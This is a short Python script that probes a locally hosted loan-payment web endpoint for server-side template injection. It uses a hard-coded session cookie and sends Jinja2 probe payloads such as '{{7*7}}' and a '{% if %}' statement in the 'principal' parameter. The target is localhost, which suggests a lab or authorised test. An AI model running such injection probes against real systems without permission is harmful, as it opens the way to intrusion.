import requests
import urllib.parse
import json

base_url = "http://127.0.0.1:5000"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cookie": session_cookie
}

# Test 1: Baseline legitimate request
print("Baseline request")
try:
    resp = requests.get(f"{base_url}/total_loan_payments?principal=1000&interest=5&term=12", headers=headers, timeout=10)
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('content-type', 'N/A')}")
    print(f"Raw response:\n{resp.text}")
    
    # Check if response is proper JSON
    try:
        json_data = json.loads(resp.text)
        print(f"Response is valid JSON: {json_data}")
    except:
        print("Response is NOT valid JSON (raw HTML/text)")
except Exception as e:
    print(f"Error: {e}")

# Test 2: Template injection attempts
for payload in ["{{7*7}}", "%7B%7B7*7%7D%7D"]:
    print(f"\nTesting payload: {payload}")
    try:
        resp = requests.get(f"{base_url}/total_loan_payments?principal={payload}&interest=5&term=12", headers=headers, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:300]}...")
    except Exception as e:
        print(f"Error: {e}")

# Test 3: Alternative template syntax
print("\nTesting Jinja2 statement syntax")
try:
    resp = requests.get(f"{base_url}/total_loan_payments?principal={urllib.parse.quote('{% if True %}test{% endif %}')}&interest=5&term=12", headers=headers, timeout=10)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:300]}...")
except Exception as e:
    print(f"Error: {e}")

